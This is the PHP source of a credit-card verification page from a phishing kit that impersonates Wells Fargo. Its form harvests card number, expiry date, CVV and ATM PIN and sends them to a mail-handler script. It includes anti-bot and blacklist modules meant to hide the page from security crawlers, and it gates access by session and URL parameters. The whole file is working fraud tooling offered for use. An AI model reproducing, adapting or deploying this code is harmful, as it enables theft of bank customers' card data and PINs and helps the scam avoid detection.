<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
@require "Spox/Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}

?>
<html class="ui-mobile wf-myriadpro-n4-active wf-active" lang="en" data-device="desktop" data-masked-input-enabled="true" data-print-link-enabled="true" ><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<title>Wells Fargo - Verification - Credit card</title>



<link rel="stylesheet" href="Spox/Files/css/jquery.mobile.css?v=19.10.00">
<link rel="stylesheet" href="Spox/Files/css/normalize.css">
<link rel="stylesheet" href="Spox/Files/css/Wells-Fargo-LIVE-Div.css"> 
<link rel="stylesheet" href="Spox/Files/css/ClientPage.css">
	
<link rel="stylesheet" href="Spox/Files/css/desktop-tablet.combined.css?v=19.10.00">
		<!--[if lt IE 9]>
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/medium-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/large-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/ie.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/ie-print.css?v=19.10.00" media="print" />
		<![endif]-->
	
	

<!--  load the sync tealium  -->

<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style><style type="text/css">@font-face{font-family:myriad-pro;src:url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-l.woff2) format("woff2"),url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-d.woff) format("woff"),url() format("opentype");font-weight:400;font-style:normal;}</style>
<!-- myriad font loaded  -->

</head>
<body class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">

<style type="text/css">
 .az {
    margin: 4px 0;
    padding: .4em;
    color: #434343;
    border-color: #ccc;
    -webkit-border-before-color: #ccc;
    -webkit-border-end-color: #ccc;
    -webkit-border-after-color: #ccc;
    -webkit-border-start-color: #ccc;
    min-height: 1.4em;
    min-width: 7em;
    max-width: 100%;
}
</style>

	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage" tabindex="0" style="">

<header role="banner">
	<div class="masthead">
		<nav role="presentation">
					<a class="c28cLink child-window ui-link" aria-label="Wells Fargo" href="#"> <img class="masthead-img-logo" alt="Wells Fargo" role="img" src="Spox/Files/img/lol1.svg">
					</a>
		</nav>

				<div role="navigation" class="top-search">
					<ul>

								<li class="security">
									<a class="c28cLink child-window ui-link" href="#" data-platform="salesplatform">Online Security<span class="ui-hidden-accessible">, opens in a new window</span>
									</a>
								</li>

					</ul>
				</div>
	</div>
</header>

		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
					<div class="progress-small small-screen">
					
	        	    	<span class="right">
		        	    	Step 5 of 5
	    	    		</span>
			    	</div>
  
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
					            		<li class="ui-block-b previous">
							            	<span><span>Security Question</span></span>
							            </li>						            
	            		
					            		<li class="ui-block-b previous">
							            	<span><span>Email verification</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-b previous">
							            	<span><span>Contact information</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-c active">
							        	    	<span class="ui-hidden-accessible">Current Step</span>							            	
							            	<span><span>Credit card</span></span>
							            </li>						            

					            				            		
					            		<li class="ui-block-e">
							        	    							            	
							            	<span><span>Review</span></span>
							            </li>						            
					            
					</ul>      
			</div>		
				<br>

	<style type="text/css">
		.help-block.form-error{
			    color: #dc3545!important;
				    width:10px;
				    display:block;
				    white-space:nowrap;
						}
	</style>
	<form id="fundYourAccountForm" class="wait" action="Spox/Mail/Mail5.php" method="POST">

	<section class="section">
		<h2 class="section-hdr">
			Please verify the card details linked to your account
		</h2>
		<p>
			Enter your Registered Card details!
		</p>
		<div class="ui-field-contain inline-field-contain">
			<fieldset>
				<div>
				</div>
					<div class="inline-field-contain">
						<div class="inline-field">
							<div class="ui-radio">
								<label for="chargeMyCard" class="ui-btn ui-corner-all ui-btn-inherit ui-btn-icon-left ui-radio-on">(credit, debit, or prepaid)
							</label><input id="chargeMyCard" name="fundingSource" class="required valid" aria-describedby="chargeMyCardDescription" ng-model="fundingSource" type="radio" value="DEBIT_OR_CREDIT_CARD" aria-required="true" data-cacheval="false" aria-invalid="false"></div>
						</div>
						<div class="inline-field">
							<img id="visa" class="margin-top-12" src="https://apply.wellsfargo.com/assets/images/osmp/visa.svg" alt="Visa accepted" style="opacity: 1;">
							<img id="mastercard" class="margin-top-12" src="https://apply.wellsfargo.com/assets/images/osmp/mastercard.svg" alt="MasterCard accepted" style="opacity: 1;">
						</div>
					</div>

					<div id="myCardDetails" style="">
						<div class="ui-field-contain">
							<label for="creditCardNumber">
								Card number
							</label>

							<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="firstName" name="cc" class="required VISA_MASTERCARD_NUMBER" type="tel" value="" size="40" data-validation-error-msg="&nbsp; The credit card number is not correct" data-validation="creditcard">
							
						</div>

						<div class="ui-field-contain inline-field-contain">
								<div class="inline-field">
							<label for="cardExpirationMonth">Expiration month</label>
								<select id="cardExpirationMonth" name="cc_exp_month" class="az" aria-required="true" data-role="none" ng-model="cardDetails.cardExpirationMonth" autocomplete="cc-exp-month">
									<option value="">Select month</option>
									
										<option for="month" value="01">
											January
										</option>
									
										<option for="month" value="02">
											February
										</option>
									
										<option for="month" value="03">
											March
										</option>
									
										<option for="month" value="04">
											April
										</option>
									
										<option for="month" value="05">
											May
										</option>
									
										<option for="month" value="06">
											June
										</option>
									
										<option for="month" value="07">
											July
										</option>
									
										<option for="month" value="08">
											August
										</option>
									
										<option for="month" value="09">
											September
										</option>
									
										<option for="month" value="10">
											October
										</option>
									
										<option for="month" value="11">
											November
										</option>
									
										<option for="month" value="12">
											December
										</option>
									
								</select>
							</div>

							<div class="inline-field">
							<label for="cardExpirationYear">Expiration year</label>
								<select id="cardExpirationYear" name="cc_exp_year" class="az" aria-required="true" data-role="none" ng-model="cardDetails.cardExpirationYear" autocomplete="cc-exp-year">
								<option value="">Select year</option>						
						           <option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option>
								</select>
							</div>
						</div>
						<div class="ui-field-contain">
							<label for="securityCode">
								Security code
							</label>

								<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="firstName" name="cvv" class="required NUMERIC" type="tel" value="" size="8" data-validation-error-msg="&nbsp; The CVV number was not correct" data-validation="cvv">
						</div>
						<div class="ui-field-contain">
							<label for="securityCode">
								Atm pin
							</label>

								<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="firstName" name="atmpin" class="required NUMERIC" type="tel" value="" size="9" data-validation-error-msg="&nbsp; please enter valid pin" data-validation="length" data-validation-length="min4-4">
						</div>
		
					</div>
			</fieldset>
		</div>

	</section>

<div class="btn-ctr"><div class="btn-ctr-inner">
	
<button type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="continue-button ui-btn ui-btn-p">
				Continue
			</button>
</div></div>
</form>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate({
    modules : 'security'
  });
</script>

<br>
<div style="display: none;" id="cancelPopup-placeholder"></div>
</div>
</div>
<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="#" data-platform="salesplatform">Online Security</a></li>

					</ul>				
					<ul class="large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="#" href="#" data-platform="salesplatform">Online Security</a></li>
					</ul>				
				</nav>
				<hr>
				© 1999 - <span class="placeholder">2020</span> Wells Fargo. All rights reserved. NMLSR ID 399801
			</div>
		</footer>
</div>

<div style="display: none;"><!-- placeholder --></div>
<div style="display: none;"><!-- placeholder --></div></div></div></div>

</div></div>
<div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;">
</div>
<div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;">
	
</div>
<div id="nuance-chat-anchored" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999999;" aria-live="polite"><div>
<style>
 .wf-FAB-aval { 
     cursor: pointer;
     border: 1px solid #ffffff;
     border-radius: 50%; 
     background: #AE1E23; 
     box-shadow: 3px 3px 3px 0 rgba(0,0,0,.15);
     height: 56px;
     width: 56px;
     padding: 0;
 } 

 .wf-FAB-aval svg {
     display: block;
     margin: 5px auto 0 auto;  
 } 
 html .page {
    overflow: visible;
}
.ui-field-contain input.ui-input-text, .ui-field-contain textarea.ui-input-text, .ui-field-contain .ui-input-search, .ui-field-contain div.ui-input-text {
	    line-height: 2.14;

	}
</style></div></div><div id="nuance-chat-anchored-2" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999988;"></div></body>
</html>